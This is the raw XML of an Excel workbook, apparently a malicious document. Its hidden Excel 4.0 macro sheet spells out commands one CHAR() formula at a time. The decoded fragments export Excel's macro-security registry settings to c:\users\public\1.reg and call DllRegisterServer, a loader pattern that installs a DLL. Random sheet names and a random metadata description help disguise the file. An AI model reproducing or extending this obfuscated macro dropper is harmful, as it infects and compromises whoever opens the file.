    <row r="143" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D143" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
      <c r="L143" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="M143" s="1" t="str">
        <f>CHAR(102)</f>
        <v>f</v>
      </c>
      <c r="O143" s="1" t="str">
        <f>CHAR(68)</f>
        <v>D</v>
      </c>
    </row>
    <row r="144" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D144" t="s">
        <v>3</v>
      </c>
      <c r="M144" t="s">
        <v>3</v>
      </c>
      <c r="O144" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="145" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D145" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="M145" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
      <c r="O145" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
    </row>
    <row r="146" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D146" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="M146" t="str">
        <f>CHAR(104)</f>
        <v>h</v>
      </c>
      <c r="O146" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
    </row>
    <row r="147" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D147" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="M147" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="O147" s="1" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
    </row>
    <row r="148" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D148" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="M148" t="str">
        <f>CHAR(109)</f>
        <v>m</v>
      </c>
      <c r="O148" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="149" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D149" t="str">
        <f>CHAR(38)</f>
        <v>&amp;</v>
      </c>
      <c r="M149" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="O149" s="1" t="str">
        <f>CHAR(103)</f>
        <v>g</v>
      </c>
    </row>
    <row r="150" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D150" t="s">
        <v>3</v>
      </c>
      <c r="M150" t="s">
        <v>3</v>
      </c>
      <c r="O150" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="151" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D151" t="str">
        <f>CHAR(71)</f>
        <v>G</v>
      </c>
      <c r="M151" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="O151" s="1" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
    </row>
    <row r="152" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D152" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="M152" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="O152" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
    </row>
    <row r="153" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D153" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="M153" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="O153" s="1" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
    </row>
    <row r="154" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D154" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
      <c r="M154" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="O154" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="155" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D155" t="s">
        <v>3</v>
      </c>
      <c r="M155" t="s">
        <v>3</v>
      </c>
      <c r="O155" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="156" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D156" t="str">
        <f>CHAR(87)</f>
        <v>W</v>
      </c>
      <c r="M156" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="O156" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
    </row>
    <row r="157" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D157" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
      <c r="M157" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="O157" s="1" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
    </row>
    <row r="158" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D158" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="M158" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="O158" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="159" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D159" t="str">
        <f>CHAR(75)</f>
        <v>K</v>
      </c>
      <c r="M159" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="O159" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
    </row>
    <row r="160" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D160" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="O160" s="1" t="str">
        <f>CHAR(118)</f>
        <v>v</v>
      </c>
    </row>
    <row r="161" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D161" t="s">
        <v>3</v>
      </c>
      <c r="O161" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="162" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D162" t="str">
        <f>CHAR(80)</f>
        <v>P</v>
      </c>
      <c r="O162" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="163" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D163" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="O163" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
    </row>
    <row r="164" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D164" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="O164" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
    </row>
    <row r="165" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D165" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="O165" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
    </row>
    <row r="166" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D166" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="O166" s="1" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
    </row>
    <row r="167" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D167" t="str">
        <f>CHAR(50)</f>
        <v>2</v>
      </c>
      <c r="O167" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
    </row>
    <row r="168" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D168" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="O168" s="1" t="str">
        <f>CHAR(53)</f>
        <v>5</v>
      </c>
    </row>
    <row r="169" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D169" t="str">
        <f>CHAR(38)</f>
        <v>&amp;</v>
      </c>
      <c r="O169" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
    </row>
    <row r="170" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D170" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
    </row>
    <row r="171" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D171" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
    </row>
    <row r="172" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D172" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
    </row>
    <row r="173" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D173" t="str">
        <f>CHAR(120)</f>
        <v>x</v>
      </c>
    </row>
    <row r="174" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D174" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
    </row>
    <row r="175" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D175" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="176" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D176" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
    </row>
    <row r="177" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D177" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
    </row>
    <row r="178" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D178" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
    </row>
    <row r="179" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D179" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="180" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D180" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
    </row>
    <row r="181" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D181" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
    </row>
    <row r="182" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D182" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
    </row>
    <row r="183" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D183" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
    </row>
    <row r="184" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D184" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
    </row>
    <row r="185" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D185" t="str">
        <f>CHAR(121)</f>
        <v>y</v>
      </c>
    </row>
    <row r="186" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D186" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
    </row>
    <row r="187" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D187" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
    </row>
    <row r="188" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D188" t="str">
        <f>CHAR(58)</f>
        <v>:</v>
      </c>
    </row>
    <row r="189" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D189" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
    </row>
    <row r="190" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D190" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
    </row>
    <row r="191" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D191" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
    </row>
    <row r="192" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D192" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="193" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D193" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
    </row>
    <row r="194" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D194" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
    </row>
    <row r="195" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D195" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
    </row>
    <row r="196" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D196" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
    </row>
    <row r="197" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D197" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
    </row>
    <row r="198" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D198" t="str">
        <f>CHAR(98)</f>
        <v>b</v>
      </c>
    </row>
    <row r="199" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D199" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
    </row>
    <row r="200" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D200" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
    </row>
    <row r="201" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D201" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
    </row>
    <row r="202" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D202" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
    </row>
    <row r="203" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D203" t="str">
        <f>CHAR(49)</f>
        <v>1</v>
      </c>
    </row>
    <row r="204" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D204" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
    </row>
    <row r="205" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D205" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
    </row>
    <row r="206" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D206" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="207" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D207" t="str">
        <f>CHAR(103)</f>
        <v>g</v>
      </c>
    </row>
    <row r="208" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D208" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
    </row>
    <row r="209" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D209" t="str">
        <f>CHAR(47)</f>
        <v>/</v>
      </c>
    </row>
    <row r="210" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D210" t="str">
        <f>CHAR(121)</f>
        <v>y</v>
      </c>
    </row>
    <row r="211" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D211" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
    </row>
    <row r="212" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D212" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
    </row>
    <row r="213" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D213" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
    </row>
    <row r="214" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D214" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
    </row>
    <row r="215" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D215" t="str">
        <f>CHAR(53)</f>
        <v>5</v>
      </c>
    </row>
    <row r="216" spans="4:4" x14ac:dyDescent="0.25">
      <c r="D216" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
    </row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup orientation="portrait" horizontalDpi="300" verticalDpi="300" r:id="rId1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Q51"/>
  <sheetViews>
    <sheetView workbookViewId="0"/>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="16384" width="9.140625" style="4"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:43" s="3" customForma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</row>
    <row r="2" spans="1:43" s="3" customForma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spans="1:43" s="3" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A3" s="2"/>
      <c r="B3" s="2"/>
      <c r="C3" s="2"/>
      <c r="D3" s="2"/>
      <c r="E3" s="2"/>
      <c r="F3" s="2"/>
      <c r="H3" s="2"/>
      <c r="I3" s="2"/>
      <c r="J3" s="2"/>
      <c r="K3" s="2"/>
      <c r="L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</row>
    <row r="4" spans="1:43" s="3" customForma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</row>
    <row r="5" spans="1:43" s="3" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A5" s="2"/>
      <c r="B5" s="2" t="s">
        <v>2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</row>
    <row r="6" spans="1:43" s="3" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A6" s="2"/>
      <c r="B6" s="2"/>
      <c r="C6" s="2"/>
      <c r="D6" s="2"/>
      <c r="E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</row>
    <row r="7" spans="1:43" s="3" customForma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 t="s">
        <v>0</v>
      </c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</row>
    <row r="8" spans="1:43" s="3" customFormat="1" x14ac:dyDescent="0.25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</row>
    <row r="9" spans="1:43" s="3" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A9" s="2"/>
      <c r="B9" s="2"/>
      <c r="C9" s="2"/>
      <c r="D9" s="2"/>
      <c r="E9" s="2"/>
      <c r="F9" s="2"/>
      <c r="G9" s="2"/>
      <c r="H9" s="2" t="s">
        <v>0</v>
      </c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</row>
    <row r="10" spans="1:43" s="3" customForma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</row>
    <row r="11" spans="1:43" s="3" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A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</row>
    <row r="12" spans="1:43" s="3" customForma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</row>
    <row r="13" spans="1:43" s="3" customForma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</row>
    <row r="14" spans="1:43" s="3" customForma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</row>
    <row r="15" spans="1:43" s="3" customFormat="1" x14ac:dyDescent="0.25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</row>
    <row r="16" spans="1:43" s="3" customForma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</row>
    <row r="17" spans="1:43" s="3" customFormat="1" x14ac:dyDescent="0.25">
      <c r="B17" s="2"/>
      <c r="C17" s="2"/>
      <c r="D17" s="2"/>
      <c r="E17" s="2"/>
      <c r="F17" s="2"/>
      <c r="G17" s="2"/>
      <c r="H17" s="2"/>
      <c r="I17" s="2"/>
      <c r="J17" s="2"/>
      <c r="K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</row>
    <row r="18" spans="1:43" s="3" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A18" s="2"/>
      <c r="B18" s="2" t="s">
        <v>2</v>
      </c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</row>
    <row r="19" spans="1:43" s="3" customForma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 t="s">
        <v>1</v>
      </c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</row>
    <row r="20" spans="1:43" s="3" customForma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</row>
    <row r="21" spans="1:43" s="3" customForma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</row>
    <row r="22" spans="1:43" s="3" customForma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</row>
    <row r="23" spans="1:43" s="3" customForma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</row>
    <row r="24" spans="1:43" s="3" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A24" s="2"/>
      <c r="B24" s="2"/>
      <c r="C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</row>
    <row r="25" spans="1:43" s="3" customForma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</row>
    <row r="26" spans="1:43" s="3" customForma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</row>
    <row r="27" spans="1:43" s="3" customForma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</row>
    <row r="28" spans="1:43" s="3" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A28" s="2"/>
      <c r="B28" s="2"/>
      <c r="C28" s="2"/>
      <c r="D28" s="2"/>
      <c r="E28" s="2"/>
      <c r="F28" s="2"/>
      <c r="G28" s="2"/>
      <c r="H28" s="2"/>
      <c r="I28" s="2" t="s">
        <v>1</v>
      </c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</row>
    <row r="29" spans="1:43" s="3" customForma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</row>
    <row r="30" spans="1:43" s="3" customForma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</row>
    <row r="31" spans="1:43" s="3" customForma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</row>
    <row r="32" spans="1:43" s="3" customForma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</row>
    <row r="33" spans="1:43" s="3" customForma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</row>
    <row r="34" spans="1:43" s="3" customForma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</row>
    <row r="35" spans="1:43" s="3" customForma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</row>
    <row r="36" spans="1:43" s="3" customForma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</row>
    <row r="37" spans="1:43" s="3" customForma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</row>
    <row r="38" spans="1:43" s="3" customForma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</row>
    <row r="39" spans="1:43" s="3" customForma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</row>
    <row r="40" spans="1:43" s="3" customForma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</row>
    <row r="41" spans="1:43" s="3" customForma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</row>
    <row r="42" spans="1:43" s="3" customForma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</row>
    <row r="43" spans="1:43" s="3" customForma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</row>
    <row r="44" spans="1:43" s="3" customForma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</row>
    <row r="45" spans="1:43" s="3" customForma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</row>
    <row r="46" spans="1:43" s="3" customForma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</row>
    <row r="47" spans="1:43" s="3" customForma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</row>
    <row r="48" spans="1:43" s="3" customForma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</row>
    <row r="49" spans="1:43" s="3" customForma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</row>
    <row r="50" spans="1:43" s="3" customForma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</row>
    <row r="51" spans="1:43" s="3" customFormat="1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</row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3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Excel 4.0 Macros</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="2" baseType="lpstr">
      <vt:lpstr>Sheet1</vt:lpstr>
      <vt:lpstr>1294mTTcvy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:description>7oS3iupetBMFJuiK279</dc:description>
  <cp:lastModifiedBy/>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-04-07T08:55:27Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2020-04-18T14:32:34Z</dcterms:modified>
</cp:coreProperties>
</file>